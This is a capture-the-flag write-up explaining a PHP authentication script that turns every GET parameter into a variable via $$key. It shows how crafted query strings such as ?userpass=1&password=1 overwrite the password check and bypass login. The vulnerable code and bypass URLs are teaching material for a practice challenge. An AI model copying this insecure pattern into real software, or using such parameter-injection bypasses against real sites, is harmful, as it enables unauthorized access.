# I Change My Own Variables

## Challenge Text

> This site is run by a serious web admin. But the web developer doesn't know that much. URL: moo.com (any script you want); Exploit this code:

```php
<?php
        $password = 'IWantToCow';
        foreach ($_GET as $key => $value)
        {
          $$key = $value;
        }
        if ($userpass == $password)
        {
                ok();
        }
        else
        {
                echo "&lt;form&gt;&lt;input type='text' name='usertext' /&gt;&lt;input type='submit'&gt;&lt;form&gt;";
        }
?>
```

## Writeup

For this challenge we're given the PHP source code for an authentication script, and told to exploit the vulnerability found within. In order to make finding the vulnerability easier for us, we can break down the code, line by line, to better understand its functionality.

**Lines 1-2:** Opening ```<?php``` tag indicates start of php program, the string "```IWantToCow```" is stored in the ```$password``` variable.

```php
<?php
    $password = 'IWantToCow';
```

**Lines 3-6:** A foreach loop is created that iterates through every element of the ```$_GET``` super global and assigns all query parameters to a variable with the same name which stores the query parameters value. For example, if the URL is ```https://www.moo.com/index.php?hello=world&name=john```, then this part of the code would create two variables named ```hello```, and ```name```, which will hold the values ```world```, and ```john```.

```php
foreach ($_GET as $key => $value)
{
    $$key = $value;
}
```

**Lines 7-10:** A conditional statement is created which checks if the ```$userpass``` variables value is equal to value stored in the ```$password``` variable, if so the ```ok``` function is called. The ```ok``` function is never defined in this program, but it's assumed it authenticates the user. Another thing to note here, the ```$userpass``` variable is not defined anywhere in the script.

```php
if ($userpass == $password)
{
    ok();
}
```

**Lines 11-16:** If the conditional statement above has failed, the else code block is executed, which echoes a simple HTML ```<form>``` with two ```<input>``` elements, one of type text and the other of type submit. After this, the program ends.

```php
else
{
    echo "&lt;form&gt;&lt;input type='text' name='usertext' /&gt;&lt;input type='submit'&gt;&lt;form&gt;";
}
?>
```

Parsing through the whole program it becomes easy to see that the vulnerability lies in allowing users to create their own variables through the URL GET Request. A user can exploit this vulnerability by injecting malicious code or overwriting existing variables, which is exactly what we're going to be doing in this challenge since we know the name of the variables checked in the conditional statement responsible for authenticating users.

```php
if ($userpass == $password)
```

In order to pass this check we'll need to create a variable named ```$userpass``` and another variable named ```$password```, we'll also need to make sure that both variables contain the same value. We'll do this by crafting a URL similar to the following.

```https://www.moo.com/index.php?userpass=1&password=1```

**Side Note:** You'd think that because the ```$password``` variable is hardcoded into the script, we could pass the check with ```moo.com/index.php?userpass=IWantToCow```, but this isn't the case. For some reason the value of ```$password``` isn't really ```IWantToCow```, it's empty. I'm not sure if this is an unintended bug or a simple mistake. But this does mean we can also pass this challenge by using the following URL.

```https://www.moo.com/index.php?userpass=```

Below are some of the URL's I used to pass this challenge.


```https://www.moo.com/index.php?userpass=IWantToCow&password=IWantToCow```

```https://www.moo.com/index.php?userpass=1&password=1```

```https://www.moo.com/index.php?userpass=```
